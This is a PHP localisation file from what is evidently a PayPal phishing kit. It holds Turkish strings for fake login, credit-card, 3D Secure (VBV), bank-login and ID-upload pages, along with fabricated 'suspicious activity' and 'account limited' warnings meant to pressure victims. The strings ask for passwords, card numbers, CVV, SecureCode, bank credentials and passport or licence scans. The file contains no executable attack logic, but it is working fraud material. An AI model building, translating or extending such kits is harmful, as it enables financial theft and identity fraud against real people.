<?php
#LOGIN
$wiz_111 = 'PayPal hesabınıza giriş yapın';
$wiz_222 = 'Oturum açmada sorun mu yaşıyorsunuz?';
$wiz_333 = 'Kaydol';
$wiz_444 = 'PayPal Inc için Tüm Hakları Saklıdır';
$wiz_900 = 'E-posta';
$wiz_901 = 'Parola';
$wiz_902 = 'Oturum aç';
#INFO
$wiz_555 = 'Profil';
$wiz_666 = 'Sizin fotoğraf güncelleyin';
$wiz_777 = 'Tekrar merhaba!';
$wiz_888 = 'PayPal Hesap Limited Has Been!';
$wiz_999 = 'Gerekli Bilgi';
$wiz_903 = 'İsim';
$wiz_904 = 'Soyadı';
$wiz_905 = 'Adres';
$wiz_906 = 'Şehir';
$wiz_907 = 'Belirtmek, bildirmek';
$wiz_910 = 'Posta';
$wiz_911 = 'Telefon numarası';
#-----NAV
$wiz_101 = 'özet';
$wiz_102 = 'Aktivite';
$wiz_103 = 'Transfer';
$wiz_104 = 'Cüzdan';
$wiz_105 = 'Dergiler';
$wiz_106 = 'Çıkış Yap';
$wiz_107 = 'Ana menü';
$wiz_108 = 'Hesap';
$wiz_109 = 'Güvenlik';
$wiz_112 = 'Ödemeler';
$wiz_113 = 'Bildirimler';
#------FOOTER
$wiz_114 = 'YARDIM / İLETİŞİM';
$wiz_115 = 'GÜVENLİK';
$wiz_116 = 'Her hakkı saklıdır.';
$wiz_117 = 'gizlilik saygı';
$wiz_118 = 'Yasal Sözleşmeler';
$wiz_119 = 'Yorumlar';
#-------CCV
$wiz_120 = 'Kredi kartı';
$wiz_121 = 'Kartın üzerindeki ad';
$wiz_123 = 'Kart numarası';
$wiz_124 = "Exp.";
$wiz_125 = 'CVV (3-4) code';
$wiz_126 = 'Adres Satırı';
$wiz_127 = 'Onayla ve Süreçler';
#--------VBV
$wiz_128 = 'Doğrulama Hoşgeldiniz™';
$wiz_129 = 'kimliğinizi doğrulamak için aşağıdaki bilgileri giriniz.';
$wiz_130 = 'Kart Son Kullanma Tarihi:';
$wiz_131 = 'Kart Doğrulama Kodu:';
$wiz_132 = 'Doğum günü:';
$wiz_133 = 'Şifre veya SecureCode (3d) :';
$wiz_134 = 'Her hakkı saklıdır.';
#--------BANK
$wiz_135 = 'Bu Haberleşme bankalardan birini seçin';
$wiz_136 = 'Güvenli';
$wiz_137 = 'Ben farklı bir banka var';
$wiz_138 = "Bu bilgileri paylaşmak için güvenlidir. PayPal kaydetmek değildir.";
$wiz_139 = 'Tıklayarak';
$wiz_140 = 'Devam et';
$wiz_141 = 'Banka hesabımı bağlamak için şartları ve koşulları kabul etmiş olursunuz.';
$wiz_142 = 'Banka';
$wiz_143 = "Bu bilgileri paylaşmak için güvenlidir. PayPal kaydetmek değildir.";
$wiz_144 = 'Kullanıcı adı';
$wiz_145 = 'Parola';
$wiz_146 = 'Tıklayarak';
$wiz_147 = 'Devam et';
$wiz_148 = 'Banka hesabımı bağlamak için şartları ve koşulları kabul etmiş olursunuz.';
$wiz_149 = 'Banka';
$wiz_150 = 'adı Banka';
#--------Loading AND Police
$wiz_151 = 'İşleme';
$wiz_152 = 'Şüpheli Etkinlikler - Payapl';
$wiz_153 = 'Biz düzenli olarak potansiyel hileli faaliyet erken belirtileri bakmak hesabınızı korumaya yardımcı olmak için.';
$wiz_154 = 'Biz olası yetkisiz etkinlik endişe ediyoruz';
$wiz_155 = 'Eğer kimliğinizi doğrulamak sonra, hesabınızın daha güvenli hale getirmek için adımlarda size yol göstereceğiz.';
$wiz_156 = 'Bilinmeyen bir cihazdan giriş yapın';
$wiz_157 = 'Ossining, ABD yakın';
$wiz_158 = 'Sadece güvenli olması için, biz bu hesabınızın olduğundan emin olmak istiyorum.';
$wiz_159 = 'Temas';
$wiz_160 = 'Güvenlik';
$wiz_161 = 'Çıkış Yap';
$wiz_162 = 'Aşağıdaki adımlar, tam üzerinde hesabınızın güvenliğini korumak için doldurdu olmalı ve o bir atılım olmadığını';
#--------UPLOAD CART ID
$wiz_163 = 'Kimliğinizi onaylayın';
$wiz_164 = 'seçmek';
$wiz_165 = 'kimlik belgesi yükleyin (Önerilen)';
$wiz_166 = 'Bir metnini alacak';
$wiz_167 = 'otomatik telefon almak';
$wiz_168 = 'Bir an için diğer seçenekleri deneyin mevcut değil bu seçeneği Hata';
$wiz_169 = 'Belgenin Hangi tür upload edecek?';
$wiz_170 = 'Göster dosya gereksinimleri';
$wiz_171 = "Dosyalar 10 MB'den küçük olmalıdır.";
$wiz_172 = 'JPG, GIF, PNG, veya PDF: Bu dosya türlerinden birini kullanın.';
$wiz_173 = 'up-to-date ve okunaklı detaylar görüntüler dosya yükleyin.';
$wiz_174 = 'birini seçin';
$wiz_175 = "Ehliyet";
$wiz_176 = 'Pasaport';
$wiz_177 = 'askeri kimlik';
?>